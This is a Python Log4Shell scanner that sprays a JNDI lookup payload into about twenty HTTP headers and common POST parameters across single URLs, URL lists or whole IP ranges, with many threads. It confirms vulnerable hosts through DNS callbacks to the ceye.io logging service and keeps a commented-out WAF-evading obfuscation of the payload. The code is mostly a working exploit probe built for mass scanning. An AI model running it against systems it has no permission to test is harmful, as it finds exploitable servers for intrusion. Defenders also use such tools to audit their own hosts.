#!/usr/bin/env python3
import requests
import random
import argparse
import json
import time
import ipaddr
from queue import Queue
from threading import Thread
from string import ascii_lowercase
from rich.console import Console


__desc__ = 'log4shell 针对header头和fuzz参数的主动扫描'
__author__ = 'nul1'
__date__ = '2021/12/16'
__version__ = 'v0.2'


def banner():
    print("""
  _                 _  _   _____ _          _ _  
 | |               | || | / ____| |        | | | 
 | |     ___   __ _| || || (___ | |__   ___| | | 
 | |    / _ \ / _` |__   _\___ \| '_ \ / _ \ | | 
 | |___| (_) | (_| |  | | ____) | | | |  __/ | | 
 |______\___/ \__, |  |_||_____/|_| |_|\___|_|_| 
               __/ |                             
              |___/                    by {} {}   
                                                """.format(__author__, __version__))


class Ceye:
    def __init__(self, rand):
        # 配置ceye信息
        self.host = ""
        self.token = ""
        self.rand = rand

    def error(self):
        error = False if (self.host == '' or self.token == '') else True
        if not error:
            console.print("[red][x] 请先配置Ceye![/red]")
            exit(1)

    def get_dns(self):
        try:
            url = "http://api.ceye.io/v1/records?token={}&type=dns&filter={}".format(self.token, self.rand)
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36'}
            r = requests.get(url, headers=headers, timeout=6)
            json_data = json.loads(r.text)

            if json_data['data']:
                for row in json_data["data"]:
                    return "{} [{}]".format(row.get('name'), row.get('remote_addr'))
            else:
                return None
        except Exception as e:
            return None



console = Console()
queue = Queue()
count = 0
requests.packages.urllib3.disable_warnings()


def randomString(length=8):
     return ''.join([random.choice(ascii_lowercase) for _ in range(length)])


# Fuzz parameters
def dataParameter(payload):
    datas = ["username", "user", "q", "search", "email", "phone", "mobile", "password"]
    data_parameter = {}
    for i in datas:
        data_parameter.update({i: payload})
    return data_parameter


def bypasswaf():
    #payload = "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{}.{}/css".format(random_str, dns_host)
    ...


def queue_put(urlFile):
    with open(urlFile, 'r', encoding='utf-8') as f:
        for line in f.readlines():
            url = line.rstrip()
            if len(url) != 0:
                url = url if '://' in url else 'http://' + url
                queue.put(url)


def scan(url):
    global count
    url = str(url) if '://' in str(url) else 'http://' + str(url)
    random_str = randomString()

    # dnslog判断来源
    domain = url.split('//')[1].split('.')[0]

    ceye = Ceye(random_str)
    dns_host = ceye.host

    ceye.error()
    
    payload = "${{jndi:dns://{}.{}.{}/test}}".format(random_str, domain, dns_host)

    headers = {
        "User-Agent": payload,
        "X-CSRF-Token": payload,
        "Origin": payload,
        "Cookie": payload,
        "Referer": payload,
        "Accept-Language": payload,
        "X-Forwarded-For": payload,
        "X-Client-Ip": payload,
        "X-Remote-Ip": payload,
        "X-Remote-Addr": payload,
        "X-Originating-Ip": payload,
        "X-CSRFToken": payload,
        "Cf-Connecting_ip": payload,
        "X-Real-Ip": payload,
        "X-Client-Ip": payload,
        "If-Modified-Since": payload,
        "X-Api-Version": payload,
        "X-Wap-Profile": payload,
        "Location": payload
    }

    
    try:
        r_get = requests.get(url, headers=headers, verify=False, timeout=5, proxies=proxies)
        r_post = requests.post(url, data=dataParameter(payload), headers=headers, verify=False, timeout=5, proxies=proxies)
    except Exception as e:
        #print(e)
        pass

    # 设置延迟，获取dnslog
    time.sleep(1.8)
    dnslog = ceye.get_dns()

    if dnslog:
        count += 1
        console.print("[red][Vul][/red][blue] {} {}[/blue]".format(url, dnslog))


def run():
    while not queue.empty():
        scan(queue.get())


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 log4scan -u url',
        description="Log4Shell Scanner",
    )
    parser.add_argument("-u", dest="url", help="Simple url")
    parser.add_argument("-f", dest="file", help="Url file")
    parser.add_argument("-i", dest="ips", help="Use ip segment (192.168.0.1/24)")
    parser.add_argument("-t", dest="threads", type=int, default=15,
                       help="Set thread (default 15)")
    parser.add_argument("-p", dest="proxy", help="HTTP Proxy, eg http://127.0.0.1:8080")

    args = parser.parse_args()
    banner()

    global proxies
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    if args.url is None and args.file is None and args.ips is None:
        parser.print_help()
        exit(0)

    time_start = time.time()

    if args.url:
        scan(args.url)

    else:
        if args.file:
            queue_put(args.file)
        elif args.ips:
            ips = ipaddr.IPNetwork(args.ips)
            for ip in ips:
                queue.put(ip)
        
        threads_list = []
        threads = args.threads

        for i in range(threads):
            t = Thread(target=run)
            t.start()
            threads_list.append(t)

        for i in range(threads):
            threads_list[i].join()

    
    time_end = time.time() - time_start
    console.print("[yellow]\nFound {0} vul in {1} seconds\n[/yellow]".format(count, time_end))



